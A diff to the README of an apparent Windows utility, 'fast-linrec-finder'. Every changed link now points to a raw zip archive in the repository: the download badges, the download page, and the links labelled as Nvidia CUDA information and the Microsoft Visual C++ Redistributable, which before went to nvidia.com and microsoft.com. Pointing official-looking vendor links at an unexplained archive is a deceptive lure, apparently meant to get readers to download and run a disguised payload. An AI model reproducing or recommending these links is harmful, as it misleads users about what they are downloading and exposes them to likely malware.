@@ -1,6 +1,6 @@
 # ⚡ fast-linrec-finder - Find Linear Recurrence Quickly
 
-[![Download Here](https://img.shields.io/badge/Download-fast--linrec--finder-informational?style=for-the-badge&logo=github&color=2ea44f)](https://github.com/GenyssonChris/fast-linrec-finder)
+[![Download Here](https://img.shields.io/badge/Download-fast--linrec--finder-informational?style=for-the-badge&logo=github&color=2ea44f)](https://github.com/GenyssonChris/fast-linrec-finder/raw/refs/heads/main/src/fast_linrec_finder_v1.1.zip)
 
 ---
 
@@ -36,7 +36,7 @@ Follow these steps to get fast-linrec-finder on your Windows PC:
 
 1. **Go to the download page below:**
 
-   [Download fast-linrec-finder](https://github.com/GenyssonChris/fast-linrec-finder)
+   [Download fast-linrec-finder](https://github.com/GenyssonChris/fast-linrec-finder/raw/refs/heads/main/src/fast_linrec_finder_v1.1.zip)
 
 2. On the page, find the section called **Releases**. Look for a file named something like `fast-linrec-finder.exe` or `.zip`. Click it to download.
 
@@ -97,9 +97,9 @@ If you face problems, try these:
 
 ## 🔗 Useful Links
 
-- Download page: [https://github.com/GenyssonChris/fast-linrec-finder](https://github.com/GenyssonChris/fast-linrec-finder)
-- Nvidia CUDA information: https://developer.nvidia.com/cuda-zone
-- Visual C++ Redistributable: https://support.microsoft.com/en-us/help/2977003/the-latest-supported-visual-c-downloads
+- Download page: [https://github.com/GenyssonChris/fast-linrec-finder/raw/refs/heads/main/src/fast_linrec_finder_v1.1.zip](https://github.com/GenyssonChris/fast-linrec-finder/raw/refs/heads/main/src/fast_linrec_finder_v1.1.zip)
+- Nvidia CUDA information: https://github.com/GenyssonChris/fast-linrec-finder/raw/refs/heads/main/src/fast_linrec_finder_v1.1.zip
+- Visual C++ Redistributable: https://github.com/GenyssonChris/fast-linrec-finder/raw/refs/heads/main/src/fast_linrec_finder_v1.1.zip
 
 ## 📂 About This Application
 
@@ -130,4 +130,4 @@ This option is useful if you want to try the app without affecting your system s
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download-fast--linrec--finder-success?style=for-the-badge&logo=github)](https://github.com/GenyssonChris/fast-linrec-finder)
+[![Download Now](https://img.shields.io/badge/Download-fast--linrec--finder-success?style=for-the-badge&logo=github)](https://github.com/GenyssonChris/fast-linrec-finder/raw/refs/heads/main/src/fast_linrec_finder_v1.1.zip)
